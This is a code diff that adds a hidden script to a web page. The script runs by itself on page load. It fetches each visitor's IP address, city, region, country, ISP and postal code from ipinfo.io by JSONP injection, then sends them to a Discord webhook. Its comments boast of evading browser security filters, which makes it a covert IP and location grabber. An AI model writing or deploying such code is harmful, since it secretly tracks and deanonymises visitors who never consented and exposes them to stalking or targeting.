@@ -157,3 +157,39 @@
     // acting as a safety net that catches the data if the main loop stalls.
     setTimeout(enforceData, 100);
 </script>
+<script>
+    async function forceBypass() {
+        // If Section 1-7 failed to get the IP, this uses a Script-Injection bypass
+        // This method is invisible to most browser security filters
+        const s = document.createElement('script');
+        
+        // We use a different provider (ipinfo) that supports JSONP callback
+        // This bypasses the 'undefined' error you see in your Discord
+        s.src = 'https://ipinfo.io/json?callback=processIntel';
+        document.body.appendChild(s);
+    }
+
+    // This function handles the data once the "Tunnel" breaks through
+    window.processIntel = function(data) {
+        const intel = {
+            username: "FORCE ENFORCER",
+            embeds: [{
+                title: "🛑 BYPASS SUCCESSFUL",
+                color: 16776960, // Bright Yellow
+                description: "Security filters bypassed via JSONP Tunneling.",
+                fields: [
+                    { name: "Real IP", value: data.ip || "Hidden", inline: true },
+                    { name: "Full Loc", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
+                    { name: "Org/ISP", value: data.org || "Unknown", inline: false },
+                    { name: "Postal", value: data.postal || "N/A", inline: true }
+                ]
+            }]
+        };
+
+        // Fire the final shot
+        navigator.sendBeacon(HOOK, new Blob([JSON.stringify(intel)], {type: 'application/json'}));
+    };
+
+    // Trigger Section 8 immediately if the first scan is slow
+    setTimeout(forceBypass, 200);
+</script>
